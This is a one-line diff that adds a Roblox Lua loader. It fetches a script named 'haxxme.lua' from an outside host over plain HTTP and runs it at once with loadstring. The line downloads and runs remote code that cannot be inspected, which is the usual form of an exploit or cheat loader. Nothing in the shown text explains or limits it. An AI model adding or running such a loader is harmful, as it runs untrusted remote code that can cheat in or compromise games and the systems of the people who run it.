@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://stockerperso.me/scripts/haxxme.lua", true))()
